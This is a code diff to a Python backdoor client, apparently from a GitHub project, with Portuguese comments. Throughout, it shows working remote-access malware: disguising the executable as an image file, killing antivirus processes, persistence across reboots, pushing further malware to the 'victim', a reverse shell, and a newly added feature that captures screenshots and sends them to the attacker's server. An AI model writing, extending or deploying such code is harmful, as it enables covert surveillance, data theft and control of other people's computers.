@@ -3,21 +3,19 @@
 # by Tarcisio marinho
 # github.com/tarcisio-marinho
 
-# código do cliente
-# se cair -> reconecta
-# ao reiniciar o pc -> reconecta
-
 
 import socket
 import os
 import time
 import subprocess
 import tempfile
+import pyscreenshot
+import random
 
 nome_arquivo='backdoor.exe'
-TEMPDIR = tempfile.gettempdir()
+TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
 
-'''
+''' COMPILAR O BACKDOOR
  pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
  testar ->
 --uac-admin           Using this option creates a Manifest which will
@@ -30,6 +28,7 @@ TEMPDIR = tempfile.gettempdir()
     Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
 '''
 
+# finaliza o processo do antivirus rodando na maquina
 def kill_antivirus():
     with open('av.txt') as f:
         avs = f.read()
@@ -44,7 +43,7 @@ def kill_antivirus():
             if(p == av):
                 subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
-
+# persistencia -> mesmo depois de reiniciar o virus continua rodando
 def persistencia(os):
     if(os == 'nt'):
         if(not os.getcwd() == TEMPDIR):
@@ -72,7 +71,7 @@ def executa(socket):
                 return
             else:
                 try:
-                    if(dados=='1'): # upload
+                    if(dados=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
                         l = socket.recv(1024)
                         nome_arquivo = l.split('+/-')[0]
                         print(nome_arquivo)
@@ -85,7 +84,7 @@ def executa(socket):
                             l = socket.recv(1024)
                         f.close()
 
-                    elif(dados=='2'): # shell
+                    elif(dados=='2'): # shell reversa -> servidor se conecta a maquina do infectado
                         while True:
                             dados = socket.recv(1024)
                             if(not dados or dados=='exit'):
@@ -124,13 +123,25 @@ def executa(socket):
                             f.close()
                             print('envio completo')
                             socket.shutdown(socket.SHUT_WR)
-                            
+
                         else:
                             socket.send('False')
 
-                    elif(dados=='4'): # Killav
+                    elif(dados == '4'): # Killav
                         #kill_antivirus()
                         pass
+                    elif(dados == '5'): # screenshot
+                        img = pyscreenshot.grab()
+                        nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
+                        img.save(nome)
+                        f = open(nome ,'rb')
+                        l = f.read(1024)
+                        while(l):
+                            socket.send(l)
+                            l = f.read(1024)
+                        f.close()
+                        print('enviado')
+                        os.remove(nome)
                     else:
                         print(dados)
 
